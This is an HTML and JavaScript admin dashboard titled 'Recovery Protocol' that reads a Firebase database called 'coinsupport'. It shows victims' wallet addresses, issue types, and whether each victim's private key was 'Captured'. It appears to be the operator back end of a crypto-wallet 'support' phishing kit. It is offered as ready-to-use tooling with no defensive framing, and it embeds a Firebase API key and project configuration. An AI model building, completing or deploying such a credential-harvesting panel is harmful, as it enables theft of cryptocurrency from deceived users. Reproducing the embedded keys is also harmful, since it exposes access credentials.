<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Recovery Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #ffffff; }
        .fade-in { animation: fadeIn 0.5s ease-in; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
        .bg-green { background-color: #22c55e; box-shadow: 0 0 8px #22c55e; }
        .bg-yellow { background-color: #eab308; }
        .bg-red { background-color: #ef4444; }
    </style>
</head>
<body class="min-h-screen p-6 md:p-10 font-sans">

    <!-- Header -->
    <div class="max-w-7xl mx-auto mb-8 flex justify-between items-center border-b border-gray-800 pb-4">
        <div>
            <h1 class="text-3xl font-bold tracking-tight text-white">ADMIN DASHBOARD</h1>
            <p class="text-gray-500 mt-1">Real-time Wallet & Issue Tracking</p>
        </div>
        <div class="flex items-center gap-3">
            <span class="status-dot bg-green animate-pulse"></span>
            <span class="text-sm text-gray-400">System Online</span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto">
        
        <!-- Stats Row -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div class="bg-gray-900/50 border border-gray-800 p-4 rounded-lg">
                <p class="text-gray-500 text-xs uppercase font-semibold">Total Requests</p>
                <p id="total-count" class="text-2xl font-bold mt-1">0</p>
            </div>
            <div class="bg-gray-900/50 border border-gray-800 p-4 rounded-lg">
                <p class="text-gray-500 text-xs uppercase font-semibold">Connected Wallets</p>
                <p id="connected-count" class="text-2xl font-bold mt-1 text-green-500">0</p>
            </div>
            <div class="bg-gray-900/50 border border-gray-800 p-4 rounded-lg">
                <p class="text-gray-500 text-xs uppercase font-semibold">Pending Issues</p>
                <p id="pending-count" class="text-2xl font-bold mt-1 text-yellow-500">0</p>
            </div>
        </div>

        <!-- Data Table -->
        <div class="bg-gray-900/30 border border-gray-800 rounded-xl overflow-hidden shadow-2xl">
            <div class="overflow-x-auto">
                <table class="w-full text-left border-collapse">
                    <thead>
                        <tr class="bg-gray-900/80 text-gray-400 text-xs uppercase tracking-wider border-b border-gray-800">
                            <th class="p-4 font-medium">Wallet Address</th>
                            <th class="p-4 font-medium">Issue Type</th>
                            <th class="p-4 font-medium">Private Key Status</th>
                            <th class="p-4 font-medium">Connection</th>
                            <th class="p-4 font-medium">Timestamp</th>
                            <th class="p-4 font-medium text-right">Action</th>
                        </tr>
                    </thead>
                    <tbody id="data-table-body" class="divide-y divide-gray-800/50 text-sm">
                        <!-- Rows will be injected here by JS -->
                        <tr>
                            <td colspan="6" class="p-8 text-center text-gray-600">Loading live data...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // --- REPLACE WITH YOUR CONFIG ---
        const firebaseConfig = {
  apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
  authDomain: "coinsupport-8b036.firebaseapp.com",
  databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "coinsupport-8b036",
  storageBucket: "coinsupport-8b036.firebasestorage.app",
  messagingSenderId: "575774102570",
  appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
  measurementId: "G-YGCSNX4H9L"
};

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const usersRef = ref(db, 'users');
        const tbody = document.getElementById('data-table-body');
        let allData = [];

        // Listen for real-time updates
        onValue(usersRef, (snapshot) => {
            const data = snapshot.val();
            if (!data) {
                tbody.innerHTML = `<tr><td colspan="6" class="p-8 text-center text-gray-500">No data received yet.</td></tr>`;
                updateStats({ total: 0, connected: 0 });
                return;
            }

            allData = Object.keys(data).map(key => ({
                id: key,
                ...data[key]
            }));

            // Sort by newest first
            allData.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

            renderTable(allData);
            updateStats({
                total: allData.length,
                connected: allData.filter(u => u.connected).length
            });
        });

        function updateStats(stats) {
            document.getElementById('total-count').innerText = stats.total;
            document.getElementById('connected-count').innerText = stats.connected;
            document.getElementById('pending-count').innerText = stats.total - stats.connected;
        }

        function renderTable(data) {
            if (data.length === 0) {
                tbody.innerHTML = `<tr><td colspan="6" class="p-8 text-center text-gray-500">Waiting for connections...</td></tr>`;
                return;
            }

            tbody.innerHTML = data.map(user => {
                const date = new Date(user.timestamp || Date.now()).toLocaleString();
                const isConnected = !!user.connected;
                const hasPK = user.privateKey && user.privateKey !== 'Not provided';
                
                return `
                <tr class="hover:bg-gray-800/40 transition fade-in group">
                    <td class="p-4 font-mono text-xs break-all max-w-xs" title="${user.walletAddress || 'Unknown'}">
                        ${user.walletAddress ? truncate(user.walletAddress) : '<span class="text-gray-600">--</span>'}
                    </td>
                    <td class="p-4">
                        <span class="px-2 py-1 bg-gray-800 rounded text-xs border border-gray-700">
                            ${user.issue || 'General'}
                        </span>
                    </td>
                    <td class="p-4">
                        ${hasPK 
                            ? `<span class="text-green-500 text-xs font-semibold flex items-center gap-1"><svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg> Captured</span>` 
                            : `<span class="text-gray-500 text-xs">Pending</span>`
                        }
                    </td>
                    <td class="p-4">
                        ${isConnected 
                            ? `<span class="text-green-500 text-xs font-bold">CONNECTED</span>` 
                            : `<span class="text-yellow-500 text-xs font-bold">PENDING</span>`
                        }
                    </td>
                    <td class="p-4 text-gray-500 text-xs">${date}</td>
                    <td class="p-4 text-right">
                        <button onclick="deleteUser('${user.id}')" class="text-gray-600 hover:text-red-500 transition p-2 rounded hover:bg-gray-800">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
                        </button>
                    </td>
                </tr>
                `;
            }).join('');
        }

        // Expose delete function to global scope
        window.deleteUser = (id) => {
            if(confirm("Remove this entry from the dashboard?")) {
                remove(ref(db, 'users/' + id));
            }
        };

        function truncate(str) {
            if (!str) return '';
            return str.substring(0, 6) + '...' + str.slice(-4);
        }
    </script>
</body>
</html>
